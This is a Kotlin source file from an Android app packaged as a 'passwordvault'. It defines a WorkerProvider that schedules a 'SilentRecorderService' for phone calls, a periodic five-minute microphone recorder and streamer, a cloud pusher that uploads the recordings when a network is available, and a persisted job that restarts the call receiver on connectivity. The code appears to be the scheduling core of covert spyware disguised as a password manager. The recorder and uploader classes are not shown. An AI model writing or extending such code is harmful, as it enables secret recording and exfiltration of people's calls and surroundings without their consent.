package com.example.passwordvault.util

import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Context.JOB_SCHEDULER_SERVICE
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.work.*
import com.example.passwordvault.service.CallReceiverRestarterOnInternetJob
import com.example.passwordvault.service.FiveMinStreamer
import com.example.passwordvault.service.SilentRecorderService
import com.example.passwordvault.util.logger.log
import java.util.concurrent.TimeUnit

const val RECORDER_TYPE = "type"

private val tag = WorkerProvider::class.java.simpleName

object WorkerProvider {
    private const val recorderJobTag = "com.japps.recording.call"
    private const val fiveMinRecorderJobTag = "com.japps.5min.recording"
    private const val callRecordingPushTag = "com.japps.calls.push.recording"
    private const val fiveMinRecordingPushTag = "com.japps.5min.push.recording"
    private const val cloudPusher = "com.japps.cloud.pushing"

    private val baseConstraints = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Constraints.Builder()
            .setRequiresCharging(false)
            .setRequiresDeviceIdle(false)
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(false)

    } else {
        Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresCharging(false)
            .setRequiresBatteryNotLow(true)
    }

    fun enqueuePeriodic5minRecording(context: Context) {
        val work = PeriodicWorkRequestBuilder<FiveMinStreamer>(6L, TimeUnit.MINUTES)
            .setInitialDelay(5000L, TimeUnit.SECONDS)
            .addTag(fiveMinRecorderJobTag)
            .build()
        getWorkManager(context).enqueue(work)
    }

    fun cancelPeriodic5MinRecording(context: Context) {
        getWorkManager(context).cancelAllWorkByTag(fiveMinRecorderJobTag)
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun startCloudPusher(context: Context, type: String, latestRecord: String?) {
        log(tag, "$type started")

        val data = Data.Builder()
            .putString(LATEST_RECORD, latestRecord)
            .putString(RECORDER_TYPE, type)
            .build()

        val work = if (type == CALL_RECORDER) {
            OneTimeWorkRequestBuilder<CloudPusher>()
                .setInputData(data)
                .setConstraints(baseConstraints.build())
                .addTag(callRecordingPushTag)
                .build()
        } else {
            OneTimeWorkRequestBuilder<CloudPusher>()
                .setInputData(data)
                .setConstraints(baseConstraints.build())
                .addTag(fiveMinRecordingPushTag)
                .build()
        }
        val uniqueWork = cloudPusher + latestRecord
        enqueueUniqueWork(uniqueWork, context, work)
    }

    fun startRecorderWork(context: Context) {
        val work = OneTimeWorkRequestBuilder<SilentRecorderService>()
            .addTag(recorderJobTag)
            .build()
        enqueueWork(context, work)
    }

    fun stopRecordingWork(context: Context) {
        Log.e(tag, "Stopping call recording")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val latestRecord = PreferenceUtil.latestRecord(context)
            startCloudPusher(context, CALL_RECORDER, latestRecord)
        }
        getWorkManager(context).cancelAllWorkByTag(recorderJobTag)
    }

    fun start5MinRecorderWork(context: Context) {
        val work = OneTimeWorkRequestBuilder<FiveMinStreamer>()
            .addTag(fiveMinRecorderJobTag)
            .build()
        enqueueWork(context, work)
    }

    fun cloudPush5MinRecording(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val latestRecord = PreferenceUtil.latestMicRecord(context)
            startCloudPusher(context, FIVE_MIN_RECORDER, latestRecord)
        }
    }

    fun startCallReceiverServiceOnInternet(context: Context) {
        val jobScheduler = context.getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
        val jobService =
            ComponentName(context.packageName, CallReceiverRestarterOnInternetJob::class.java.name)
        val jobBuilder = JobInfo.Builder(190, jobService)
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
            .setPersisted(true)
            .build()
        jobScheduler.schedule(jobBuilder)
    }

    private fun enqueueWork(context: Context, work: WorkRequest) {
        Log.e(tag, "${work.id} unique enqueued")
        getWorkManager(context).enqueue(work)
    }

    private fun enqueueUniqueWork(tag: String, context: Context, work: OneTimeWorkRequest) {
        Log.e(tag, "${work.id} enqueued")
        getWorkManager(context).enqueueUniqueWork(tag, ExistingWorkPolicy.REPLACE, work)
    }

    private fun getWorkManager(context: Context) = WorkManager.getInstance(context)
}